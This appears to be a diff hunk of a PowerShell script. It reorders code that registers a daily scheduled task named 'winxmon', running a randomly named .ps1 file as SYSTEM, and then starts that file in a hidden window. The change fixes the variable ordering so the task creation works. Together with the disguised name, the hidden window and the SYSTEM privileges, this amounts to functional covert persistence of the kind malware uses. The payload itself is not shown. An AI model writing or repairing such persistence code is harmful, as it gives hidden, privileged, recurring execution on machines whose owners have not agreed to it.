@@ -165,11 +165,11 @@ Set-ItemProperty -Name Attributes -Path "$initial_dir\AEQKCPrkuifY.ps1" -Value "
 #create a new task
 $TaskName = "winxmon"
 $TaskPath = "C:\Windows\System32\Tasks\$TaskName"
-$Task = New-ScheduledTask -Action $Action -Trigger $Trigger -TaskName $TaskName -TaskPath $TaskPath -Principal $Principal -Settings $Settings
 $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "$initial_dir\AEQKCPrkuifY.ps1"
 $Trigger = New-ScheduledTaskTrigger -Daily -At 07:00AM
 $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
 $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
+$Task = New-ScheduledTask -Action $Action -Trigger $Trigger -TaskName $TaskName -TaskPath $TaskPath -Principal $Principal -Settings $Settings
 
 Start-Process -FilePath "$initial_dir\AEQKCPrkuifY.ps1" -windowstyle hidden
 
